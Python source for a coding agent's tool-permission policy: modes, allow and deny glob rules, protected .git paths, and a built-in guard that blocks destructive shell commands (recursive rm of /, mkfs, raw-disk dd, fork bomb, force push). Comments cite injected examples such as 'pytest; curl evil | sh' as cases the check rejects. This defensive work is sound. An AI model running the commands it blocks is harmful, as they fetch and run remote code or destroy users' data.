"""Permission policy: decides whether a tool call may run.

Decision order (first match wins):
1. Built-in guard for catastrophic shell commands, then deny rules.
2. read-only mode refuses everything that is not a read.
3. Allow rules (user config, flags, "always" approvals during the session).
4. The mode's default for the tool's effect; writes to protected paths (.git/)
   are downgraded from allow to ask.

A rule is ``tool`` or ``tool:glob``. The glob is matched against the call's
subject: the shell command, or the path normalized relative to the workspace.
Shell allow globs never match a command line containing shell metacharacters
(``; & | $ ` < >`` ...), so ``run_shell:pytest*`` cannot authorize
``pytest; curl evil``. Shell deny rules are also matched against each simple
command in the line, but they remain best-effort.

This is a policy layer, not a sandbox: a shell command the user approves runs
with the user's privileges. The built-in guards only catch obvious mistakes.
"""

from __future__ import annotations

import fnmatch
import re
import shlex
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Literal

from cli_agent.tools.base import ToolError, display_path, resolve_in_root

Mode = Literal["read-only", "ask", "auto-edit", "auto"]
MODES: tuple[Mode, ...] = ("read-only", "ask", "auto-edit", "auto")
Decision = Literal["allow", "deny", "ask"]

_MODE_DEFAULTS: dict[Mode, dict[str, Decision]] = {
    "read-only": {"read": "allow", "write": "deny", "execute": "deny"},
    "ask": {"read": "allow", "write": "ask", "execute": "ask"},
    "auto-edit": {"read": "allow", "write": "allow", "execute": "ask"},
    "auto": {"read": "allow", "write": "allow", "execute": "allow"},
}

# Characters that let one shell command line run more than one command, or
# substitute output of another. Shell allow globs never match lines containing
# them: `run_shell:pytest*` must not allow `pytest; curl evil | sh`.
_SHELL_META = re.compile(r"[;&|`$<>(){}\n\r\\]")
# Splits a command line into the simple commands deny rules are checked against.
_SEGMENT_SPLIT = re.compile(r"&&|\|\||[;&|\n\r`()]|\$\(")
_HOME_TARGETS = frozenset(
    {
        "/",
        "/*",
        "~",
        "~/",
        "~/*",
        "$HOME",
        "$HOME/",
        "$HOME/*",
        "${HOME}",
        "${HOME}/",
        "${HOME}/*",
        "/home",
        "/root",
        "/etc",
        "/usr",
    }
)
_PREFIXES = frozenset({"sudo", "doas", "env", "command", "exec", "nohup", "time", "nice"})


def shell_segments(command: str) -> list[str]:
    """Best-effort split into simple commands, whitespace-normalized."""
    parts = (" ".join(seg.split()) for seg in _SEGMENT_SPLIT.split(command))
    return [p for p in parts if p]


def _words(segment: str) -> list[str]:
    try:
        words = shlex.split(segment)
    except ValueError:
        words = segment.split()
    while words and (words[0] in _PREFIXES or "=" in words[0].split("/")[0]):
        words = words[1:]
    return words


def _dangerous_segment(segment: str) -> str | None:
    words = _words(segment)
    if not words:
        return None
    cmd, args = words[0].rsplit("/", 1)[-1], words[1:]
    if cmd == "rm":
        flags = [a for a in args if a.startswith("-")]
        recursive = any(
            a == "--recursive" or (not a.startswith("--") and "r" in a.lower()) for a in flags
        )
        if recursive and any(a in _HOME_TARGETS for a in args if not a.startswith("-")):
            return "recursive delete of / or the home directory"
    if cmd.startswith("mkfs"):
        return "formatting a filesystem"
    if cmd == "dd" and any(re.match(r"of=/dev/(sd|nvme|hd|vd|disk|mmcblk)", a) for a in args):
        return "writing to a raw disk"
    if cmd in ("shutdown", "reboot", "halt", "poweroff"):
        return "shutting down the machine"
    if cmd == "git" and "push" in args:
        after = args[args.index("push") + 1 :]
        if any(
            a in ("-f", "--force", "--mirror", "--force-with-lease")
            or a.startswith("--force")
            or (a.startswith("-") and not a.startswith("--") and "f" in a)
            or a.startswith("+")
            for a in after
        ):
            return "force push"
    if cmd == "chmod" and "/" in args and any(a.startswith("-") and "R" in a for a in args):
        return "recursive chmod of /"
    return None


def dangerous_reason(command: str) -> str | None:
    """Catch obviously catastrophic commands. Best-effort, not a security boundary."""
    if re.search(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:", command):
        return "fork bomb"
    for segment in shell_segments(command):
        reason = _dangerous_segment(segment)
        if reason:
            return reason
    return None


# Paths under these directories can make later commands run attacker-chosen code
# (git hooks, git config), so writing them always needs explicit approval.
PROTECTED_DIRS = (".git",)


def call_subject(tool_name: str, args: dict[str, Any], root: Path | None = None) -> str | None:
    """The string a rule glob is matched against.

    Paths are normalized to workspace-relative form when `root` is known, so
    `src/../.env` is matched as `.env`. Returns None for a path that does not
    resolve inside the workspace.
    """
    if tool_name == "run_shell":
        return str(args.get("command", "")).strip()
    for key in ("path", "pattern"):
        value = args.get(key)
        if not isinstance(value, str):
            continue
        if key == "pattern" and isinstance(args.get("path"), str):
            continue
        if key == "pattern" or root is None:
            return value.strip()
        return _normalize_path(root, value)
    if root is not None and tool_name in ("list_files", "search_files"):
        return "."
    return ""


def _normalize_path(root: Path, raw: str) -> str | None:
    try:
        resolved = resolve_in_root(root, raw)
    except ToolError:
        return None
    return display_path(root, resolved)


def is_protected(subject: str | None) -> bool:
    if subject is None:
        return False
    first = subject.split("/", 1)[0]
    return first in PROTECTED_DIRS


def _rule_parts(rule: str) -> tuple[str, str | None]:
    name, sep, glob = rule.partition(":")
    return name.strip(), (glob.strip() if sep else None)


def _allow_matches(rule: str, tool_name: str, subject: str | None) -> bool:
    name, glob = _rule_parts(rule)
    if name != tool_name:
        return False
    if glob is None:
        return True
    if subject is None:
        return False  # unresolvable path: never allowed by a glob
    if tool_name == "run_shell" and _SHELL_META.search(subject):
        return False
    return fnmatch.fnmatchcase(subject, glob)


def _deny_matches(rule: str, tool_name: str, subject: str | None) -> bool:
    name, glob = _rule_parts(rule)
    if name != tool_name:
        return False
    if glob is None or subject is None:
        return True  # unresolvable path: treat as denied
    if tool_name == "run_shell":
        candidates = [" ".join(subject.split()), *shell_segments(subject)]
        candidates += [" ".join(_words(seg)) for seg in shell_segments(subject)]
        return any(fnmatch.fnmatchcase(c, glob) for c in candidates)
    return fnmatch.fnmatchcase(subject, glob)


@dataclass
class Verdict:
    decision: Decision
    reason: str


@dataclass
class PermissionPolicy:
    mode: Mode = "ask"
    allow: list[str] = field(default_factory=list)
    deny: list[str] = field(default_factory=list)
    root: Path | None = None
    """Workspace root, used to normalize path subjects before matching."""
    approved_commands: set[str] = field(default_factory=set)
    """Exact shell commands the user approved with "always" this session."""

    def check(self, tool_name: str, effect: str, args: dict[str, Any]) -> Verdict:
        subject = call_subject(tool_name, args, self.root)
        if tool_name == "run_shell":
            reason = dangerous_reason(subject or "")
            if reason:
                return Verdict("deny", f"blocked by built-in guard: {reason}")
        for rule in self.deny:
            if _deny_matches(rule, tool_name, subject):
                return Verdict("deny", f"denied by rule {rule!r}")
        if self.mode == "read-only" and effect != "read":
            return Verdict("deny", "read-only mode: only read tools are allowed")
        if tool_name == "run_shell" and subject in self.approved_commands:
            return Verdict("allow", "approved earlier in this session")
        for rule in self.allow:
            if _allow_matches(rule, tool_name, subject):
                if effect == "write" and is_protected(subject) and _rule_parts(rule)[1] is None:
                    break  # a blanket tool rule does not cover protected paths
                return Verdict("allow", f"allowed by rule {rule!r}")
        decision = _MODE_DEFAULTS[self.mode].get(effect, "ask")
        if effect == "write" and decision == "allow" and is_protected(subject):
            return Verdict("ask", f"{subject} is a protected path (can run code later)")
        return Verdict(decision, f"{self.mode} mode default for {effect} tools")

    def remember(self, tool_name: str, args: dict[str, Any]) -> str:
        """Record an 'always allow' approval; returns a description of what was added.

        Shell approvals cover exactly the approved command line; file approvals
        cover the tool (protected paths still ask).
        """
        if tool_name == "run_shell":
            cmd = call_subject(tool_name, args) or ""
            self.approved_commands.add(cmd)
            return f"run_shell exactly {cmd!r}"
        if tool_name not in self.allow:
            self.allow.append(tool_name)
        return tool_name
